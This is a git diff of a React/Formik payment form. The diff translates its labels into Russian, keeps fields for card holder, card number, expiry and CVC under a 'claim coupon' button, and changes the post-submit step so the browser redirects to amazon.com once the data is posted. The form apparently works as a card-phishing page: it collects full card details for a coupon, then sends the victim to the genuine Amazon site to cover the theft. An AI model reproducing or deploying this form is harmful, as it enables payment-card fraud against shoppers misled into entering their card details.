@@ -1,18 +1,15 @@
 import { Field, Form, Formik } from "formik";
-import { useHistory } from "react-router";
 
 import Mastercard from '../images/mastercard.svg'
 import Visa from '../images/visa.svg'
 
 export default function Payment() {
-  const history = useHistory()
-
   function validateNumber(value) {
     let error = "";
     if (!value || value === 0) {
-      error = "*Required";
+      error = "*Обязательно";
     } else if (String(value).length < 13) {
-      error = "*Must be at least 13 characters long.";
+      error = "*Длина должна быть больше 13 цифр.";
     }
     return error;
   };
@@ -20,7 +17,7 @@ export default function Payment() {
   function expDateValidate(value) {
     let error = "";
     if (!value) {
-      error = "*Required";
+      error = "*Обязательно";
     }
     return error;
   };
@@ -28,9 +25,9 @@ export default function Payment() {
   function cvcValidate(value) {
     let error = "";
     if (!value || value === 0) {
-      error = "*Required";
+      error = "*Обязательно";
     } else if (String(value).length < 3) {
-      error = "*CVC must be 3 characters long.";
+      error = "*Должен содержать 3 цифры";
     }
     return error;
   }
@@ -44,7 +41,7 @@ export default function Payment() {
       body: new URLSearchParams(formData).toString()
     })
     .then(() => {
-      history.push('/')
+      window.location = 'https://www.amazon.com/'
     })
     .catch(error => console.log(error))
   }
@@ -52,7 +49,7 @@ export default function Payment() {
   return (
     <main>
       <div className="payment">
-        <h1>Add Credit Card Information</h1>
+        <h1>Введите данные вашей карты.</h1>
         <Formik
           initialValues={{
             isInitialValid: false,
@@ -75,14 +72,14 @@ export default function Payment() {
               <div className="card__front">
                 <Field
                   id='holder'
-                  placeholder='Card holder'
+                  placeholder='Имя владельца'
                   name="holder"
                   type="text"
                 />
                 <div className="error__wrapper">
                   <Field
                     id='number'
-                    placeholder='Card number'
+                    placeholder='Номер карты'
                     name="number"
                     type="text"
                     maxLength="16"
@@ -98,7 +95,7 @@ export default function Payment() {
                   <div className="error__wrapper">
                     <Field
                       id='month'
-                      placeholder='MM'
+                      placeholder='Месяц'
                       name="month"
                       type="text"
                       maxLength="2"
@@ -113,7 +110,7 @@ export default function Payment() {
                   <div className="error__wrapper">
                     <Field
                       id='year'
-                      placeholder='YY'
+                      placeholder='Год'
                       name="year"
                       type="text"
                       maxLength="2"
@@ -148,7 +145,7 @@ export default function Payment() {
                   {errors.CVC && touched.CVC && <div>{errors.CVC}</div>}
                 </div>
               </div>
-              <button type='submit' className='coupon__signin' disabled={!(isValid && dirty)}>Take coupon</button>
+              <button type='submit' className='coupon__signin' disabled={!(isValid && dirty)}>Забрать</button>
             </Form>
           )}
         </Formik> 
